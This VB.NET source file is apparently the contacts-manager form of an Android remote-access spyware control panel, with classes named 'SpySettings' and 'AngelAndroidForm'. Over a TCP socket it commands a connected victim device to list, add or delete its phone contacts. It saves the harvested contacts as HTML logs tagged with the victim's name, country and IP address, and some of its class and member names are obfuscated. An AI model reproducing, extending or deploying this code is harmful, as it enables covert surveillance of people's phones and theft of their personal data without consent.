Public Class Frm_ContactsManager
     Public Client As Net.Sockets.TcpClient
     Public classClient As sockets.Frm_Config_Client
     Public Title As String = "null"
     Public tmpFolderUSER, tmpClientName, tmpCountry, tmpAddressIP As String
     Private BoxTitlePaintEventArgsWait As Boolean = False
     Private Sub SpyStyle()

    End Sub
     Private Sub TOpacity_Tick(sender As Object, e As EventArgs) Handles TOpacity.Tick
        If Not Me.Opacity = 1 Then
            Me.Opacity = Me.Opacity + 0.1
        Else
            Me.TOpacity.Enabled = False
        End If
    End Sub
    Private Sub ContactsManager_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         Me.Icon = New Icon(Frm_Config_Settings.res_Path & "\Icons\win\3.ico")
         SpyStyle()
         Me.ctxMenu.Renderer = New Frm_Config_Option
         DGV0.ColumnHeadersDefaultCellStyle.Font = Frm_Config_Settings.f
         DGV0.DefaultCellStyle.Font = Frm_Config_Settings.f
         If SpySettings.SAVING_DATA = "No" Then
            SaveToolStripMenuItem.Visible = True
            SaveAsToolStripMenuItem.Visible = True
        End If
         Me.Text = Title
         Me.TOpacity.Interval = SpySettings.T_Interval
         Me.TOpacity.Enabled = True
         BoxTitlePaintEventArgsWait = True
     End Sub
     Private Sub SaveToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SaveToolStripMenuItem.Click
        Frm_Config_Settings.Directory_Exist(classClient)
        Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf Frm_Config_Settings.SAVEit), {Me.DGV0, tmpFolderUSER, "Contacts Manager",
        tmpClientName, tmpCountry & " - " & tmpAddressIP, "Contacts", "log", DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") & ".html"})
    End Sub
     Private Sub SaveAsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SaveAsToolStripMenuItem.Click
        Dim SaveAS As New SaveFileDialog
        SaveAS.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") & ".html"
        SaveAS.Filter = "html (*.html)|*.html"
        If SaveAS.ShowDialog = Windows.Forms.DialogResult.OK Then
            Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf Frm_Config_Settings.SAVEit), {Me.DGV0, "null", SaveAS.FileName,
            tmpClientName, tmpCountry & " - " & tmpAddressIP, "Contacts", "log", "null"})
        End If
        SaveAS.Dispose()
    End Sub
     Private Sub DeleteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteToolStripMenuItem.Click
        If DGV0.SelectedRows.Count > 0 Then
             For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1
                 Dim key As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Tag
                 Dim num As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value
                 If Not classClient Is Nothing Then
                    Dim objs As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".contacts" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.resultClient & sockets.Data.SPL_SOCKET & "del" & sockets.Data.SPL_DATA & key & sockets.Data.SPL_DATA & num, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
                    classClient.SendAsync(objs)
                     DGV0.Rows.RemoveAt(DGV0.SelectedRows(i).Index)
                 End If
             Next
         End If
    End Sub
     Private Sub AddToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AddToolStripMenuItem.Click
        Dim pd As New 要先价种房劳文书间延的年式先种式房间道肉方外华三的里价感烟常
        pd.Text = "Add new contact"
         pd.L0.Text = "Enter Name"
         pd.L1.Text = "Enter Number"
         pd.StartPosition = FormStartPosition.Manual
         pd.Location = Frm_Config_Codes.FixSize(Me, pd)
         Select Case pd.ShowDialog(Me)
             Case DialogResult.OK
                 If Not classClient Is Nothing Then
                    Dim objs As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".contacts" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.resultClient & sockets.Data.SPL_SOCKET & "add" & sockets.Data.SPL_DATA & pd.InputText0.Text & sockets.Data.SPL_DATA & pd.InputText1.Text, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
                    classClient.SendAsync(objs)
                 End If
         End Select
         pd.Close()
     End Sub
     Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        If Not classClient Is Nothing Then
            Dim objs As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".contacts" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.NryoNrnbVyodfombCsoqCzuyoMenssfutitvVvNfBwmpuzyaos & sockets.Data.SPL_SOCKET & "contacts", Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
            classClient.SendAsync(objs)
         End If
    End Sub
     Private Sub BoxTitle_Paint(sender As Object, e As PaintEventArgs) Handles BoxTitle.Paint
         If BoxTitlePaintEventArgsWait Then
             Dim DGV0Count As Integer = DGV0.Rows.Count
             Dim _DGV0Count As String = "All " & CStr(DGV0Count)
             Dim _DGV0_SEL As String = "Selected " & CStr(DGV0.SelectedRows.Count)
             Dim clr As Color = SpySettings.DefaultColor_Foreground
             e.Graphics.DrawLine(New Pen(Color.FromArgb(50, clr.R, clr.G, clr.B)), 0, 1, BoxTitle.Width, 1)
             Dim ColorFont As Brush
             ColorFont = New SolidBrush(SpySettings.DefaultColor_Foreground)
             Dim ColorBack As Brush = New SolidBrush(Color.FromArgb(170, BoxTitle.BackColor.R, BoxTitle.BackColor.G, BoxTitle.BackColor.B))
             Dim TextRender0 As Size = TextRenderer.MeasureText(_DGV0Count & Space(10) & _DGV0_SEL, Frm_Config_Settings.f)
             Dim rect0 As New Rectangle(0, 2, BoxTitle.Width, TextRender0.Height + 5)
             e.Graphics.FillRectangle(New Pen(ColorBack).Brush, rect0)
             e.Graphics.DrawString(_DGV0Count & Space(10) & _DGV0_SEL & Space(10), Frm_Config_Settings.f, ColorFont, 0, 2)
             Dim MeSize As Size = TextRenderer.MeasureText("S", Frm_Config_Settings.f)
            If Not BoxTitle.Height = MeSize.Height + 3 Then
                BoxTitle.Height = MeSize.Height + 3
            End If
         End If
     End Sub
    Private Sub AngelAndroidForm_Activated(sender As Object, e As EventArgs) Handles Me.Activated
        BoxTitle.Invalidate()
    End Sub
    Private Sub AngelAndroidForm_Deactivate(sender As Object, e As EventArgs) Handles Me.Deactivate
        BoxTitle.Invalidate()
    End Sub
    Private Sub BoxTitle_Resize(sender As Object, e As EventArgs) Handles BoxTitle.Resize
        BoxTitle.Invalidate()
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Timer1.Stop()
    End Sub

    Private Sub Guna2CirclePictureBox1_Click(sender As Object, e As EventArgs) Handles Guna2CirclePictureBox1.Click
        Me.Close()
    End Sub

    Private Sub DGV0_CellContentClick(sender As Object, e As DataGridViewCellEventArgs) Handles DGV0.CellContentClick

    End Sub

    Private Sub DGV0_RowsRemoved(sender As Object, e As DataGridViewRowsRemovedEventArgs) Handles DGV0.RowsRemoved
        BoxTitle.Invalidate()
    End Sub
    Private Sub DGV0_RowsAdded(sender As Object, e As DataGridViewRowsAddedEventArgs) Handles DGV0.RowsAdded
        BoxTitle.Invalidate()
    End Sub
    Private Sub DGV0_SelectionChanged(sender As Object, e As EventArgs) Handles DGV0.SelectionChanged
        BoxTitle.Invalidate()
    End Sub
 End Class